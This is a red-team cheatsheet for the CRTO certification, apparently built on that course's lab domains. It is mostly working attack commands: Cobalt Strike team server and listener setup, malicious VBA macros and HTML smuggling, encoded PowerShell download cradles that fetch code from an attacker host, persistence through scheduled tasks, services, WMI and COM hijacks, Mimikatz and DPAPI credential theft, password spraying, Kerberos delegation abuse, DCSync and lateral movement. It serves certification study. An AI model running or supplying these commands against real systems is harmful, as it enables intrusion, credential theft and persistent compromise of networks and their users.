# CRTO Cheatsheet

> 10.10.5.50 = Attacker IP

## C2 - Cobalt Strike

### Run Server

```bash
# Run
/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

### Run as a Service

```bash
sudo vim /etc/systemd/system/teamserver.service

## Paste this
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

sudo systemctl daemon-reload
sudo systemctl start teamserver.service
sudo systemctl enable teamserver.service
```

### Listeners

#### HTTP

Config:

- Beacon HTTP
- HTTP Hosts o HTTP Hosts Stager: `attacker IP`
- Start 80 PORT: `sudo ss -lntp`

#### DNS

Config DNS

|Name |Type | Data |
|----------|----------|----------|
|@ 	|A 	|10.10.5.50|
|ns1 |A  |10.10.5.50|
|pics| NS |ns1.nickelviper.com.|

- DNS Hosts and DNS Hosts (Stager): `Attacker IP`

#### SMB

> `ls \\.\pipe\` to emulate a common name

- Pipename (C2): Input name

#### TCP

- Port (C2): Port 
- Bind to localhost only: optional


#### Pivot Listener

> A pivot listener can only be created on an existing Beacon, and not via the normal Listeners menu

1. Right-click on a Beacon and select Pivoting > Listener.  This will open a "New Listener" window
2. On beacon: `run netstat -anop tcp`
3. We can now generate payloads for this listener

## Initial Compromise

### Outlook

```powershell
Import-Module C:\Tools\MailSniper\MailSniper.ps1
#Enumerate the NetBIOS name 
Invoke-DomainHarvestOWA -ExchHostname mail.test.local
# Get a list of users
./namemash.py names.txt > possible.txt
# timing attack to validate which (if any) of these usernames are valid
Invoke-UsernameHarvestOWA -ExchHostname mail.test.local -Domain <NETBIOS NAME> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
# Password Spraying
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
# Get Address List
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

### Initial Access Payloads

> One significant difference (apart from how you dress it up to the user), is that any file downloaded via a browser (outside of a trusted zone) will be tainted with the "Mark of the Web" (MOTW).

```powershell
## Get Zone data of file
Get-Content .\test.txt -Stream Zone.Identifier
```
The possible zones are:

- 0 => Local computer
- 1 => Local intranet
- 2 => Trusted sites
- 3 => Internet
- 4 => Restricted sites

#### VBA Shell

> Cobalt Strike > Attacks > Scripted Web Delivery > Select Payload 

```vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell payload here"

End Sub
```

*You save the doc `as .doc` ~~not .docx or .docm~~*

##### Remote Template Injection

Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.

1. Save the document as a dot file
2. 7Zip > Open archive.  Navigate to word > _rels, right-click on settings.xml.rels and select Edit.
3. Change `Target=` to `Target="http://nickelviper.com/template.dot"`

or use this tool

```bash
python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
```

#### HTML Smuggling

```bash
cat file | base64
# And modify the file variable and the fileName
```

```html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

#### Host Reconnaissance

```bash
# List processes
ps

# Collect Data
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshots
printscreen               ##Take a single screenshot via PrintScr method
screenshot                ##Take a single screenshot
screenwatch               ##Take periodic screenshots of desktop

# Keylogger
keylogger               ## RUn keylogger
jobs                    ## List jobs
jobkill <id>               ## Kill job (keylogger)

# Clipboard
clipboard               ## Get Clipboard

# list the logon sessions on this machine
net logons
```

##### Web Categorization

- https://sitereview.bluecoat.com/
- https://github.com/mdsecactivebreach/Chameleon

## Persistence

> Remember that SYSTEM processes cannot authenticate to the web proxy, so we can't use HTTP Beacons.  Use P2P or DNS Beacons instead.

### SharPersist

- https://github.com/mandiant/SharPersist


* -t is the desired persistence technique.
* -c is the command to execute.
* -a are any arguments for that command.
* -n is the name of the task.
* -m is to add the task (you can also remove, check and list).
* -o is the task frequency.

#### Windows Services

This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.  This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.

```bash
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

#### WMI Events

- https://github.com/Sw4mpf0x/PowerLurk

Persistence via WMI events can be achieved by leveraging the following three classes:

* EventConsumer
* EventFilter
* FilterToConsumerBinding


```bash
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
# Remove backdoor
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```

#### Task Scheduler

```powershell
# If you generate a powershell payload (Windows)
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

```bash
# If you generate a powershell payload (Linux)
set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
```

#### Startup Folder

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
```

#### Registry AutoRun

```bash
# Upload a file.exe to C:|ProgramData\ or another directory and rename to Updater.exe 
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

#### Hunting for COM Hijacks

1. Open Process Monitor
2. Filter Operation is RegOpenKey
3. Result is NAME NOT FOUND
4. Path ends with InprocServer32
5. Find one that's loaded semi-frequently but not so much so or loaded when a commonly used application

Example:

HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32 is loaded by C:\Windows\System32\DllHost.exe

```powershell
Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

> To clean-up a COM hijack, simply remove the registry entries from HKCU and delete the DLL.

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

we can verify that it's currently implemented in HKLM and not HKCU.

```powershell
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
```

## Host Privilege Escalation

### Windows Services

```powershell
#List Services
sc query
Get-Service | fl
```

### Unquoted Service Paths

> When you start the service, you'll see its state will be START_PENDING.  If you then check its status with sc query VulnService1, you'll see it will be STOPPED.  This is by design

```powershell
# Check with SharpU
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
# Manual check
run wmic service get name, pathname
# Get if you have write permission
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```

### Weak Service Permissions

```powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
# Change path
run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
# Validate changed path
run sc qc VulnService2
run sc stop VulnService2
run sc start VulnService2
```

### Weak Service Binary Permissions

BUILTIN\Users have Modify privileges over Service 

> This allows us to overwrite the binary with something else (make sure you take a backup first).

```powershell
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
download Service 3.exe
copy "tcp-local_x64.svc.exe" "Service 3.exe"
upload C:\Payloads\Service 3.exe
run sc stop VulnService3
upload C:\Payloads\Service 3.exe
run sc start VulnService3
```

### UAC Bypass

- https://github.com/cobalt-strike/ElevateKit

```powershell
whoami /groups
# Medium or High. Medium no Admin and you need bypass UAC, High Admin
beacon> elevate uac-schtasks tcp-local
```

## Credential Theft

### Mimikatz

- The `!` elevates Beacon to SYSTEM before running the given command
- The `@` impersonates Beacon's thread token before running the given command

```bash
beacon> mimikatz token::elevate ; lsadump::sam
beacon> mimikatz !lsadump::sam

#Logon Passwords (lsass)
beacon> mimikatz !sekurlsa::logonpasswords

# Kerberos Encryption Keys
beacon> mimikatz !sekurlsa::ekeys

# SAM
beacon> mimikatz !lsadump::sam

# Domain Cached Credentials
# DCC is orders of magnitude slower to crack than NTLM.
# $DCC2$<iterations>#<username>#<hash>
beacon> mimikatz !lsadump::cache
```

### Extracting Kerberos Tickets

```bash
# List tickets
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Extract specif user ticket
# This will output the ticket(s) in base64 encoded format
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
```

### DCSync

```bash
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
```

## Wordlists

### Rules

```bash
hashcat.exe -a 0 -m 1000 ntlm.txt rockyou.txt -r rules\add-year.rule
# or -r /usr/share/hashcat/rules/add-months.rule -r /usr/share/hashcat/rules/add-year.rule
```

### Masks

```bash
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff
```

```bash
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
```

`-1 ?d?s` defines a custom charset (digits and specials)

`?u?l?l?l?l?l?l?l?1` is the mask, where ?1 is the custom charset.

```bash
# Custom
hashcat.exe -a 3 -m 1000 ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
```

Also you can write your file.hcmask

```bash
ZeroPointSecurity?d
ZeroPointSecurity?d?d
ZeroPointSecurity?d?d?d
ZeroPointSecurity?d?d?d?d

# or 
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
```

### Combinator

```bash
# Ejemplo output pass1 pass2. pass1-pass2!
hashcat.exe -a 1 -m 1000 ntlm.txt list1.txt list2.txt -j $- -k $!
```

### Hybrid

`-a 6` specifies the hybrid wordlist + mask mode

`?d?d?d?d` is the mask.

```bash
hashcat.exe -a 6 -m 1000 ntlm.txt list.txt ?d?d?d?d
```

### Kwprocessor

```cmd
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o keywalk.txt
```

## Domain Recon

- https://github.com/PowerShellMafia/PowerSploit
- https://github.com/tevora-threat/SharpView

### PowerView CheatSheet o SharpView

```bash
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```

```bash
# Returns a domain object for the current domain or the domain specified with -Domain
beacon> powershell Get-Domain

# Returns the domain controllers for the current or specified domain.
beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl

# Returns all domains for the current forest or the forest specified by -Forest.
beacon> powershell Get-ForestDomain

# Returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.
beacon> powershell Get-DomainPolicyData | select -expand SystemAccess

# Return all (or specific) user(s). To only return specific properties, use -Properties. By default, all user objects for the current domain are returned, use -Identity to return a specific user.
# If you run this command without the -Identity parameter, prepare to wait a while for all the data to return.
beacon> powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

# Return all computers or specific computer objects.
beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

# Search for all organization units (OUs) or specific OU objects.
beacon> powershell Get-DomainOU -Properties Name | sort -Property Name

# Return all domain groups or specific domain group objects.
beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

# Return the members of a specific domain group.
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName

# Return all Group Policy Objects (GPOs) or specific GPO objects. To enumerate all GPOs that are applied to a particular machine, use -ComputerIdentity.
beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

# Returns all GPOs that modify local group membership through Restricted Groups or Group Policy Preferences.
beacon> powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

#Enumerates the machines where a specific domain user/group is a member of a specific local group. 
beacon> powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

# Return all domain trusts for the current or specified domain.
beacon> powershell Get-DomainTrust
```

### AdSearch

You can add `--json`, `--full` and `--attributes`

```bash
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
```

## User Impersonation

### Pass-the-Hash

```bash
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
# To "drop" impersonation 
beacon> rev2self
```

### Pass the Ticket

is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to,

> a logon session can only hold a single TGT at a time.

```bash
# new hidden process createnetonly
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
# or less anomalous
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
# Import ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

beacon> steal_token 4748
beacon> rev2self
beacon> kill 4748
```

### Overpass the Hash

request a Kerberos TGT for a user

```bash
# RC4
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
# AES256
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap
# OPSEC
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

### Token Impersonation

> This technique works by obtaining a handle to the target process

```bash
# List process
beacon> ps
PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking

# Steal token
beacon> steal_token 5536
```

### Token store

This is an evolution on the steal_token command which allows you to steal and store tokens for future use

> The rev2self command will drop the impersonation token, but it will remain in the store so that it can be impersonated again

```bash
# Steal
beacon> token-store steal 5536
# List
beacon> token-store show
# Use
beacon> token-store use 0
# remove
beacon> token-store remove <id>
# remove all
beacon> token-store remove-all
```

### Make token

> This also means that `make_token` is not applicable to anything you may want to run on the current machine.  For that, `spawnas` may be a better solution.


```bash
beacon> make_token DEV\jking Qwerty123
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
```

### Process Injection

`shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine; and `inject` will inject a full Beacon payload for the specified listener.


* 4464 is the target PID.
* x64 is the architecture of the process.
* tcp-local is the listener name.


```bash
beacon> inject 4464 x64 tcp-local
```

## Lateral Movement

`jump [method] [target] [listener]`

```bash
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

`remote-exec [method] [target] [command]`

```bash
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

```bash
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
```

### Windows Remote Management (WinRM)

```bash
beacon> jump winrm64 web.dev.cyberbotic.io smb
```

### PsExec

```bash
beacon> jump psexec64 web.dev.cyberbotic.io smb
# psexec_psh doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit)
beacon> jump psexec_psh web smb
```

### Windows Management Instrumentation (WMI)

```bash
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
Started process 3280 on web.dev.cyberbotic.io
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

```bash
# Error
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to web.dev.cyberbotic.io: 5

beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"
```

### DCOM

```bash
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
# Connect
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

## Session Passing

```bash
beacon> spawn x64 http
```

### Spawn and Inject

shinject and shspawn.  Both allow you to inject an arbitrary shellcode blob - `shinject` can inject into an existing process, and `shspawn` will spawn a new process.

```bash
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
```

## Data Protection API

> DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by third-party applications like Google Chrome to store website credentials.

### Credential Manager

```bash
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
# Seatbelt
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
```

#### Decrypt

> This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the @ modifier.

```bash
# Get the master key (ADMIN is required)
beacon> mimikatz !sekurlsa::dpapi
# Anothe way
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
# Decrypt
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```

### Scheduled Task Credentials

Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on

```bash
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
beacon> mimikatz !sekurlsa::dpapi
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
```

## Kerberos

### Kerberoasting

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap

# Select accounts
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

### Asreproast

```bash
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```

### Unconstrained Delegation

> Domain Controllers are always permitted for unconstrained delegation.

#### NO Forced Authentication

```bash
# Find hosts
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
# show all the tickets that are currently cached
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Extract ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
# start a new logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
# Steal token
beacon> steal_token 1540
```

#### Forced Authentication

> To stop Rubeus, use the `jobs` and `jobkill` commands

```bash
# Monitor
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
# Force Dc2=target web=listener
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
# Use ticket
```

### Constrained Delegation

>   Make sure to always use the FQDN.  Otherwise, you will see 1326 errors.

* `/impersonateuser` is the user we want to impersonate.
* `/msdsspn` is the service principal name that SQL-2 is allowed to delegate to.
* `/user` is the principal allowed to perform the delegation.
* `/ticket` is the TGT for /user.


```bash
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
#   You can also request one with Rubeus asktgt if you have NTLM or AES hashes.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
# Remember that we can impersonate any user in the domain, but we want someone who we know to be a local admin on the target
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
# New logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
beacon> steal_token 5540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
# or
beacon> jump psexec64 dc-2.dev.cyberbotic.io smb
```

### Alternate Service Name

We can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it happily.

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
beacon> steal_token 2580
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

### S4U2Self Abuse

> In the Unconstrained Delegation module, we obtained a TGT for the domain controller.  If you tried to pass that ticket into a logon session and use it to access the C$ share (like we would with a user TGT), it would fail. This is because `machines do not get remote local admin access to themselves`.  What we can do instead is abuse S4U2Self to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin).  Rubeus has a /self flag for this purpose.

Possible error

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP

[*] Using DEV\DC-2$:FakePass

[*] Showing process : False
[*] Username        : DC-2$
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2832
[+] Ticket successfully imported!
[+] LUID            : 0x4d977f

beacon> steal_token 2832

beacon> ls \\dc-2.dev.cyberbotic.io\c$
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```